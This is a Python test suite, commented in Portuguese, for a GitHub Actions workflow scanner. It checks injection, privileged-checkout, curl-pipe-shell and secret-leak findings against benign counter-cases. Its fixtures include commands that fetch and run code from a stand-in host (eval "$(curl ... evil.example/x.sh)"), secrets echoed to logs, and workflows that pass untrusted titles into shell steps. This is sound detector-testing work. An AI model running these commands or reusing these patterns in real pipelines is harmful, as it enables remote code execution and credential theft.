"""Invariantes da auditoria cruzada FP↔FN (2026-08-29): cada família de falso-negativo fechada
ganha um teste da CLASSE **e** uma CONTRAPROVA de que o benigno equivalente NÃO dispara — é a
fronteira (dado confiável vs. não-confiável) que separa o ataque do idioma legítimo. Fechamos
também os 2 FP residuais (persist-credentials string, imagem por matriz com digest).

Cada teste monta um workflow autocontido e olha os `check_id` emitidos. A contraprova é o que
impede a correção de virar um FP novo: taint só propaga texto CRU (não o sanitizado), o checkout
privilegiado só acusa o head do fork (não a base), o heredoc só vaza quando vai ao stdout.
"""

from __future__ import annotations

from pathlib import Path

from esteira.checks.engine import scan


def _ids(tmp_path: Path, text: str) -> set[str]:
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    (wf_dir / "w.yml").write_text(text.lstrip("\n"), encoding="utf-8")
    return {f.check_id for f in scan(tmp_path).findings}


_SHA = "b4ffde65f46336ab88eb53be808477a3936bae11"


# --------------------------------------------------------------------------- #
# taint: contexto não-confiável que chega ao sink por um DESVIO
# --------------------------------------------------------------------------- #
def test_taint_steps_outputs_cru_injeta(tmp_path: Path) -> None:
    wf = """
on: issues
permissions: {contents: read}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - id: s1
        env:
          T: ${{ github.event.issue.title }}
        run: echo "t=$T" >> "$GITHUB_OUTPUT"
      - run: echo "${{ steps.s1.outputs.t }}"
"""
    assert "script-injection" in _ids(tmp_path, wf)


def test_taint_steps_output_sanitizado_nao_injeta(tmp_path: Path) -> None:
    # CONTRAPROVA: o título passa por `$( … | tr -c 'a-z' …)` — filtrado, não é mais texto cru.
    wf = """
on: issues
permissions: {contents: read}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - id: t
        env:
          TITULO: ${{ github.event.issue.title }}
        run: echo "slug=$(echo "$TITULO" | tr -c 'a-z' '-')" >> "$GITHUB_OUTPUT"
      - run: echo "slug ${{ steps.t.outputs.slug }}"
"""
    assert "script-injection" not in _ids(tmp_path, wf)


def test_taint_needs_outputs_entre_jobs(tmp_path: Path) -> None:
    wf = """
on: pull_request_target
permissions: {contents: read}
jobs:
  a:
    runs-on: ubuntu-latest
    outputs:
      t: ${{ steps.s.outputs.t }}
    steps:
      - id: s
        env:
          T: ${{ github.event.pull_request.title }}
        run: echo "t=$T" >> "$GITHUB_OUTPUT"
  b:
    needs: a
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ needs.a.outputs.t }}"
"""
    assert "script-injection" in _ids(tmp_path, wf)


def test_needs_outputs_de_dado_confiavel_nao_injeta(tmp_path: Path) -> None:
    # CONTRAPROVA: a saída vem de `$(date)`, dado do runner — não do atacante.
    wf = """
on: push
permissions: {contents: read}
jobs:
  a:
    runs-on: ubuntu-latest
    outputs:
      v: ${{ steps.s.outputs.v }}
    steps:
      - id: s
        run: echo "v=$(date +%Y%m%d)" >> "$GITHUB_OUTPUT"
  b:
    needs: a
    runs-on: ubuntu-latest
    steps:
      - run: echo "build ${{ needs.a.outputs.v }}"
"""
    assert "script-injection" not in _ids(tmp_path, wf)


def test_taint_github_env_dinamico(tmp_path: Path) -> None:
    wf = """
on: issues
permissions: {contents: read}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          T: ${{ github.event.issue.title }}
        run: echo "TITLE=$T" >> "$GITHUB_ENV"
      - run: echo "${{ env.TITLE }}"
"""
    assert "script-injection" in _ids(tmp_path, wf)


def test_env_estatico_confiavel_encadeado_nao_injeta(tmp_path: Path) -> None:
    # CONTRAPROVA: env dinâmica só é taint se o VALOR exportado for cru — aqui é github.sha.
    wf = """
on: push
permissions: {contents: read}
env:
  VERSAO: ${{ github.sha }}
  TAG: ${{ env.VERSAO }}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "tag ${{ env.TAG }}"
"""
    assert "script-injection" not in _ids(tmp_path, wf)


def test_taint_matrix_include(tmp_path: Path) -> None:
    wf = """
on: issues
permissions: {contents: read}
jobs:
  j:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        include:
          - cmd: ${{ github.event.issue.title }}
    steps:
      - run: echo "${{ matrix.cmd }}"
"""
    assert "script-injection" in _ids(tmp_path, wf)


def test_matrix_de_literais_nao_injeta(tmp_path: Path) -> None:
    # CONTRAPROVA: valores de matriz literais (ubuntu/windows, 3.11/3.12) não são injetáveis.
    wf = """
on: push
permissions: {contents: read}
jobs:
  j:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest]
        python: ["3.11", "3.12"]
    steps:
      - run: echo "py ${{ matrix.python }} em ${{ matrix.os }}"
"""
    assert "script-injection" not in _ids(tmp_path, wf)


# --------------------------------------------------------------------------- #
# toJSON de objeto do evento e head.ref do PR associado a workflow_run
# --------------------------------------------------------------------------- #
def test_tojson_do_evento_injeta(tmp_path: Path) -> None:
    wf = """
on: issues
permissions: {contents: read}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo '${{ toJSON(github.event) }}' > event.json
"""
    assert "script-injection" in _ids(tmp_path, wf)


def test_tojson_de_escalar_seguro_nao_injeta(tmp_path: Path) -> None:
    # CONTRAPROVA: um número serializado não quebra string — não é texto livre do atacante.
    wf = """
on: pull_request_target
permissions: {contents: read}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo '${{ toJSON(github.event.pull_request.number) }}'
"""
    assert "script-injection" not in _ids(tmp_path, wf)


def test_workflow_run_pr_head_ref_injeta(tmp_path: Path) -> None:
    wf = """
on:
  workflow_run:
    workflows: [CI]
    types: [completed]
permissions: {contents: read}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.workflow_run.pull_requests[0].head.ref }}"
"""
    assert "script-injection" in _ids(tmp_path, wf)


# --------------------------------------------------------------------------- #
# checkout do código do PR sob gatilho privilegiado (não só pull_request_target)
# --------------------------------------------------------------------------- #
def test_ppt_git_clone_do_fork_por_shell(tmp_path: Path) -> None:
    wf = """
on: pull_request_target
permissions: {contents: read}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          REPO: ${{ github.event.pull_request.head.repo.full_name }}
          REF: ${{ github.event.pull_request.head.ref }}
        run: |
          git clone --branch "$REF" "https://github.com/$REPO" pr
          cd pr && npm install
"""
    assert "pull-request-target-checkout" in _ids(tmp_path, wf)


def test_issue_comment_gh_pr_checkout(tmp_path: Path) -> None:
    wf = f"""
on:
  issue_comment:
    types: [created]
permissions: {{contents: read}}
jobs:
  j:
    if: github.event.issue.pull_request
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{_SHA}
      - env:
          GH_TOKEN: ${{{{ secrets.GITHUB_TOKEN }}}}
          PR: ${{{{ github.event.issue.number }}}}
        run: |
          gh pr checkout "$PR"
          npm ci && npm test
"""
    assert "pull-request-target-checkout" in _ids(tmp_path, wf)


def test_workflow_run_checkout_head_sha(tmp_path: Path) -> None:
    wf = f"""
on:
  workflow_run:
    workflows: [CI]
    types: [completed]
permissions: {{contents: read}}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{_SHA}
        with:
          repository: ${{{{ github.event.workflow_run.head_repository.full_name }}}}
          ref: ${{{{ github.event.workflow_run.head_sha }}}}
      - run: npm ci && npm run build
"""
    assert "pull-request-target-checkout" in _ids(tmp_path, wf)


def test_workflow_run_somente_leitura_nao_acusa_checkout(tmp_path: Path) -> None:
    # CONTRAPROVA: baixa artefato e ecoa a branch por env indirection — nenhum checkout do fork.
    wf = f"""
on:
  workflow_run:
    workflows: [CI]
    types: [completed]
permissions: {{actions: read}}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@{_SHA}
        with:
          run-id: ${{{{ github.event.workflow_run.id }}}}
          github-token: ${{{{ github.token }}}}
      - env:
          BRANCH: ${{{{ github.event.workflow_run.head_branch }}}}
        run: echo "de $BRANCH"
"""
    assert "pull-request-target-checkout" not in _ids(tmp_path, wf)


def test_pull_request_head_sem_privilegio_nao_acusa(tmp_path: Path) -> None:
    # CONTRAPROVA: `pull_request` (não _target) roda SEM segredos — checkout do head é o normal.
    wf = f"""
on:
  pull_request:
    types: [opened, synchronize]
permissions: {{contents: read}}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{_SHA}
        with:
          ref: ${{{{ github.event.pull_request.head.sha }}}}
          repository: ${{{{ github.event.pull_request.head.repo.full_name }}}}
      - run: make test
"""
    assert "pull-request-target-checkout" not in _ids(tmp_path, wf)


# --------------------------------------------------------------------------- #
# curl | interpretador nas variantes reais
# --------------------------------------------------------------------------- #
def test_curl_variantes_executam_da_rede(tmp_path: Path) -> None:
    for cmd in (
        "bash <(curl -s https://codecov.io/bash)",
        'sh -c "$(curl -fsSL https://raw.githubusercontent.com/x/y/main/install.sh)"',
        "curl -sSL https://install.python-poetry.org | python3 -",
    ):
        wf = f"""
on: push
permissions: {{}}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: {cmd}
"""
        assert "curl-pipe-shell" in _ids(tmp_path, wf), cmd


def test_iwr_iex_powershell(tmp_path: Path) -> None:
    wf = """
on: push
permissions: {}
jobs:
  j:
    runs-on: windows-latest
    steps:
      - shell: pwsh
        run: iwr -useb https://community.chocolatey.org/install.ps1 | iex
"""
    assert "curl-pipe-shell" in _ids(tmp_path, wf)


def test_curl_baixa_verifica_executa_nao_acusa(tmp_path: Path) -> None:
    # CONTRAPROVA: baixa para arquivo, confere checksum e SÓ ENTÃO executa — sem pipe à rede.
    wf = """
on: push
permissions: {}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -fsSLo install.sh https://example.org/install.sh
          echo "abc123  install.sh" | sha256sum -c -
          bash install.sh
          curl -s https://api.example.com/v1 | jq .status
"""
    assert "curl-pipe-shell" not in _ids(tmp_path, wf)


# --------------------------------------------------------------------------- #
# segredo entregue a terceiro por reusable / action de shell
# --------------------------------------------------------------------------- #
def test_reusable_terceiro_por_branch_com_secrets_map(tmp_path: Path) -> None:
    wf = """
on: push
permissions: {contents: read}
jobs:
  deploy:
    uses: outra-org/infra/.github/workflows/deploy.yml@main
    with:
      env: prod
    secrets:
      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
"""
    assert "secret-to-thirdparty-action" in _ids(tmp_path, wf)


def test_reusable_por_sha_com_secrets_map_nao_acusa(tmp_path: Path) -> None:
    # CONTRAPROVA: fixado por SHA → código revisado/congelado; entregar o segredo é aceitável.
    wf = f"""
on: push
permissions: {{contents: read}}
jobs:
  remoto:
    uses: acme/ci-shared/.github/workflows/build.yml@{_SHA}
    secrets:
      NPM_TOKEN: ${{{{ secrets.NPM_TOKEN }}}}
"""
    assert "secret-to-thirdparty-action" not in _ids(tmp_path, wf)


def test_action_terceiro_com_input_de_shell_injeta(tmp_path: Path) -> None:
    wf = f"""
on: issue_comment
permissions: {{contents: read}}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: appleboy/ssh-action@{_SHA}
        with:
          host: example.org
          key: ${{{{ secrets.SSH_KEY }}}}
          script: |
            echo "${{{{ github.event.comment.body }}}}"
"""
    assert "script-injection" in _ids(tmp_path, wf)


def test_action_terceiro_input_shell_sem_contexto_nao_injeta(tmp_path: Path) -> None:
    # CONTRAPROVA: o input de shell sem contexto não-confiável não é injeção.
    wf = f"""
on: push
permissions: {{contents: read}}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: appleboy/ssh-action@{_SHA}
        with:
          host: example.org
          script: echo "deploy ${{{{ github.sha }}}}"
"""
    assert "script-injection" not in _ids(tmp_path, wf)


# --------------------------------------------------------------------------- #
# insecure-commands reabilitado via $GITHUB_ENV (não só via env:)
# --------------------------------------------------------------------------- #
def test_insecure_commands_via_github_env(tmp_path: Path) -> None:
    wf = """
on: pull_request_target
permissions: {contents: read}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "ACTIONS_ALLOW_UNSECURE_COMMANDS=true" >> $GITHUB_ENV
"""
    assert "insecure-commands" in _ids(tmp_path, wf)


def test_insecure_commands_false_via_github_env_nao_acusa(tmp_path: Path) -> None:
    # CONTRAPROVA: valor falsy não reativa nada.
    wf = """
on: push
permissions: {contents: read}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "ACTIONS_ALLOW_UNSECURE_COMMANDS=false" >> $GITHUB_ENV
"""
    assert "insecure-commands" not in _ids(tmp_path, wf)


# --------------------------------------------------------------------------- #
# segredo no stdout: shells não-bash, heredoc e arquivo publicado como artefato
# --------------------------------------------------------------------------- #
def test_secret_write_host_pwsh(tmp_path: Path) -> None:
    wf = """
on: push
permissions: {contents: read}
jobs:
  j:
    runs-on: windows-latest
    steps:
      - shell: pwsh
        run: Write-Host "token=${{ secrets.API_KEY }}"
"""
    assert "secret-in-run" in _ids(tmp_path, wf)


def test_secret_print_python(tmp_path: Path) -> None:
    wf = """
on: push
permissions: {contents: read}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - shell: python
        run: print("${{ secrets.API_KEY }}")
"""
    assert "secret-in-run" in _ids(tmp_path, wf)


def test_print_em_palavra_maior_nao_e_impressao(tmp_path: Path) -> None:
    # CONTRAPROVA: `fingerprint` contém "print" mas não imprime nada (fronteira de palavra).
    wf = """
on: push
permissions: {contents: read}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: MY_fingerprint="${{ secrets.API_KEY }}"
"""
    assert "secret-in-run" not in _ids(tmp_path, wf)


def test_secret_em_heredoc_para_stdout(tmp_path: Path) -> None:
    wf = """
on: push
permissions: {contents: read}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          cat <<EOF
          key=${{ secrets.API_KEY }}
          EOF
"""
    assert "secret-in-run" in _ids(tmp_path, wf)


def test_heredoc_redirecionado_a_arquivo_nao_vaza(tmp_path: Path) -> None:
    # CONTRAPROVA: o corpo do heredoc vai para arquivo / step summary, não para o log.
    wf = f"""
on: pull_request
permissions: {{contents: read}}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{_SHA}
        with:
          persist-credentials: false
      - env:
          TITULO: ${{{{ github.event.pull_request.title }}}}
        run: |
          cat > resumo.md <<'EOF'
          key=${{{{ secrets.API_KEY }}}}
          EOF
          cat <<EOF >> "$GITHUB_STEP_SUMMARY"
          commit ${{{{ github.sha }}}}
          EOF
"""
    assert "secret-in-run" not in _ids(tmp_path, wf)


def test_secret_gravado_e_publicado_como_artefato(tmp_path: Path) -> None:
    wf = f"""
on: push
permissions: {{contents: read}}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "//registry.npmjs.org/:_authToken=${{{{ secrets.NPM_TOKEN }}}}" > .npmrc
      - uses: actions/upload-artifact@{_SHA}
        with:
          name: config
          path: .npmrc
"""
    assert "secret-in-run" in _ids(tmp_path, wf)


def test_secret_para_arquivo_sem_upload_nao_vaza(tmp_path: Path) -> None:
    # CONTRAPROVA: instalar segredo em disco é canônico e seguro — sem publicação, não vaza.
    wf = f"""
on: push
permissions: {{contents: read}}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{_SHA}
        with:
          persist-credentials: false
      - run: |
          mkdir -p ~/.ssh && printf '%s\\n' "${{{{ secrets.SSH_KEY }}}}" > ~/.ssh/id_ed25519
          echo "${{{{ secrets.NPM_TOKEN }}}}" >> ~/.npmrc
"""
    assert "secret-in-run" not in _ids(tmp_path, wf)


# --------------------------------------------------------------------------- #
# os 2 FP residuais fechados
# --------------------------------------------------------------------------- #
def test_persist_credentials_string_false_nao_e_exposicao(tmp_path: Path) -> None:
    wf = f"""
on: [push]
permissions: {{contents: read}}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{_SHA}
        with:
          persist-credentials: 'false'
      - uses: actions/upload-artifact@{_SHA}
        with:
          name: workspace
          path: .
"""
    assert "checkout-credentials-in-artifact" not in _ids(tmp_path, wf)


def test_container_por_matrix_com_digest_nao_e_tag(tmp_path: Path) -> None:
    d = "sha256:c1a1b3b4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f80"
    wf = f"""
on: [push]
permissions: {{contents: read}}
jobs:
  j:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        image:
          - python:3.12@{d}
          - python:3.13@{d}
    container:
      image: ${{{{ matrix.image }}}}
    steps:
      - run: python --version
"""
    assert "unpinned-container-image" not in _ids(tmp_path, wf)


def test_container_por_matrix_com_tag_ainda_acusa(tmp_path: Path) -> None:
    # CONTRAPROVA da contraprova: se um valor da matriz NÃO tem digest, volta a acusar.
    d = "sha256:c1a1b3b4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f80"
    wf = f"""
on: [push]
permissions: {{contents: read}}
jobs:
  j:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        image:
          - python:3.12@{d}
          - python:3.13
    container:
      image: ${{{{ matrix.image }}}}
    steps:
      - run: python --version
"""
    assert "unpinned-container-image" in _ids(tmp_path, wf)


# --------------------------------------------------------------------------- #
# FN reabertos pela supressão de FP (auditoria cética 2026-08-30): A/B/C.
# Cada classe com CONTRAPROVA — o benigno equivalente segue SEM achado.
# --------------------------------------------------------------------------- #
def _run(tmp_path: Path, cmd: str, *, shell: str | None = None, trigger: str = "push") -> set[str]:
    sh = f"        shell: {shell}\n" if shell else ""
    return _ids(
        tmp_path,
        f"on: {trigger}\n"
        "permissions: {}\n"
        "jobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n"
        f"{sh}      - run: {cmd}\n",
    )


# ---- A: segredo re-emitido ao log cega o sink de saída ----
def test_secret_reemitido_ao_log_vaza(tmp_path: Path) -> None:
    # CLASSE: `tee` copia stdin→stdout, `cat`/`nl`/`rev` reemitem, e os dispositivos de terminal
    # (/dev/stderr|stdout, /proc/self/fd/1) SÃO o log — não "arquivo seguro". Todos DEVEM vazar.
    for cmd in (
        'echo "k=${{ secrets.API_KEY }}" | tee /dev/stderr',
        'echo "${{ secrets.API_KEY }}" | tee -a build.log',
        'echo "${{ secrets.API_KEY }}" | cat',
        'echo "${{ secrets.API_KEY }}" > /dev/stderr',
        'echo "${{ secrets.API_KEY }}" >> /dev/stdout',
        'echo "${{ secrets.API_KEY }}" > /proc/self/fd/1',
    ):
        assert "secret-in-run" in _run(tmp_path, cmd), cmd


def test_heredoc_reemitido_ao_log_vaza(tmp_path: Path) -> None:
    wf = """
on: push
permissions: {}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          cat <<EOF | tee /dev/stderr
          key=${{ secrets.API_KEY }}
          EOF
"""
    assert "secret-in-run" in _ids(tmp_path, wf)


def test_pipe_ou_redirect_que_nao_reemite_nao_vaza(tmp_path: Path) -> None:
    # CONTRAPROVA (FP 17/28): o consumidor transforma/grava/consome o segredo, ou o alvo é um
    # arquivo comum em disco — nenhum reemite o valor cru ao log.
    for cmd in (
        'echo "${{ secrets.KUBECONFIG_B64 }}" | base64 -d > "$HOME/.kube/config"',
        "printf '%s' \"${{ secrets.GPG_KEY }}\" | gpg --batch --import",
        'echo -n "${{ secrets.SA_JSON }}" | jq -r .project_id',
        'echo "${{ secrets.API_KEY }}" | cat > out.txt',
        'printf \'%s\' "${{ secrets.SSH_KEY }}" > id_deploy',
    ):
        assert "secret-in-run" not in _run(tmp_path, cmd), cmd


# ---- B: curl|shell via avaliadores POSIX (eval / . / source) ----
def test_eval_e_source_de_download_executam_da_rede(tmp_path: Path) -> None:
    # CLASSE: `eval "$(curl)"`, `. <(curl)`, `source <(wget)` e `curl | . /dev/stdin` rodam código
    # baixado da rede tanto quanto `curl | bash` (CWE-494).
    for cmd in (
        'eval "$(curl -fsSL https://evil.example/x.sh)"',
        'eval "$(wget -qO- https://evil.example/x.sh)"',
        ". <(curl -s https://evil.example/x.sh)",
        "source <(wget -qO- https://evil.example/x.sh)",
        "curl -fsSL https://evil.example/x.sh | . /dev/stdin",
    ):
        assert "curl-pipe-shell" in _run(tmp_path, cmd), cmd


def test_download_sem_avaliador_nao_acusa(tmp_path: Path) -> None:
    # CONTRAPROVA (FP 22): `curl | jq` / `wget | tar` NÃO passam por eval/./source — processam
    # dados, não executam código. E `eval "$(date)"` (sem download) também não é curl-pipe-shell.
    for cmd in (
        "curl -s https://api.example.com/v1 | jq .status",
        "wget -qO- https://x/a.tgz | tar xz",
        'eval "$(date +%s)"',
    ):
        assert "curl-pipe-shell" not in _run(tmp_path, cmd), cmd


# ---- C: identidade/truncamento em $(...) NÃO sanitizam o taint ----
def _taint(tmp_path: Path, inner: str) -> set[str]:
    wf = (
        "on: issues\n"
        "permissions: {contents: read}\n"
        "jobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - id: s1\n"
        "        env:\n          T: ${{ github.event.issue.title }}\n"
        f'        run: echo "v={inner}" >> "$GITHUB_OUTPUT"\n'
        '      - run: echo "${{ steps.s1.outputs.v }}"\n'
    )
    return _ids(tmp_path, wf)


def test_cmdsubst_sem_filtro_preserva_taint(tmp_path: Path) -> None:
    # CLASSE: `$( … )` só sanitiza com filtro allowlist real; identidade e truncamento preservam
    # o texto do atacante e DEVEM injetar.
    for inner in (
        '$(echo "$T")',
        '$(echo "$T" | head -c 200)',
        '$(echo "$T" | cut -c1-100)',
        "$(echo \"$T\" | awk '{print $1}')",
    ):
        assert "script-injection" in _taint(tmp_path, inner), inner


def test_cmdsubst_com_filtro_allowlist_sanitiza(tmp_path: Path) -> None:
    # CONTRAPROVA: filtros que trocam o texto cru por charset/estrutura controlada realmente
    # sanitizam — o valor deixa de carregar taint.
    for inner in (
        "$(echo \"$T\" | tr -c 'a-z' '-')",
        "$(echo \"$T\" | sed 's/[^a-z]//g')",
        '$(printf %q "$T")',
        '$(echo "$T" | sha256sum | cut -d" " -f1)',
        '$(echo "$T" | base64)',
    ):
        assert "script-injection" not in _taint(tmp_path, inner), inner
